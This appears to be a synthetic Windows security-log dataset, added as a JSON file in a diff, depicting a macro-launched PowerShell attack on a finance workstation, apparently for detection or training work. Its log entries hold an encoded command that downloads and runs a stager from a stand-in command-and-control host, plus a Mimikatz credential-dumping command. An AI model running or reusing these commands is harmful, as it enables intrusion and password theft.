@@ -1,0 +1,48 @@
+{
+  "dataset_name": "Obfuscated PowerShell & Credential Theft",
+  "source": "Windows Security Event Logs (Event ID 4688, 4104 Script Block Logging)",
+  "target_system": "finance-wkstn-04.corp.local (10.0.4.88)",
+  "timestamp_range": "2026-08-06T16:05:00Z - 2026-08-06T16:07:30Z",
+  "log_entries": [
+    {
+      "timestamp": "2026-08-06T16:05:12Z",
+      "host": "finance-wkstn-04",
+      "service": "Security-Auditing",
+      "event_id": 4688,
+      "severity": "MEDIUM",
+      "message": "A new process was created. New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe. Parent Process Name: C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE. Creator Subject: CORP\\jsmith"
+    },
+    {
+      "timestamp": "2026-08-06T16:05:15Z",
+      "host": "finance-wkstn-04",
+      "service": "PowerShell-ScriptBlock",
+      "event_id": 4104,
+      "severity": "CRITICAL",
+      "message": "ScriptBlock Text: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc aW52b2tlLWV4cHJlc3Npb24gKG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHA6Ly9tYWxpY2lvdXMtYzIudG9wL3N0YWdlci5wczEnKQ=="
+    },
+    {
+      "timestamp": "2026-08-06T16:05:22Z",
+      "host": "finance-wkstn-04",
+      "service": "Sysmon-NetworkConnect",
+      "event_id": 3,
+      "severity": "HIGH",
+      "message": "Network connection detected. Image: powershell.exe, User: CORP\\jsmith, DestinationIp: 185.220.101.5, DestinationPort: 443, DestinationHostname: malicious-c2.top"
+    },
+    {
+      "timestamp": "2026-08-06T16:06:01Z",
+      "host": "finance-wkstn-04",
+      "service": "PowerShell-ScriptBlock",
+      "event_id": 4104,
+      "severity": "CRITICAL",
+      "message": "ScriptBlock Text: Invoke-Mimikatz -DumpCreds -Command privilege::debug sekurlsa::logonpasswords"
+    },
+    {
+      "timestamp": "2026-08-06T16:07:15Z",
+      "host": "finance-wkstn-04",
+      "service": "Security-Auditing",
+      "event_id": 4672,
+      "severity": "CRITICAL",
+      "message": "Special privileges assigned to new logon. Account Name: CORP\\Administrator, Privilege List: SeDebugPrivilege, SeTcbPrivilege, SeTakeOwnershipPrivilege"
+    }
+  ]
+}
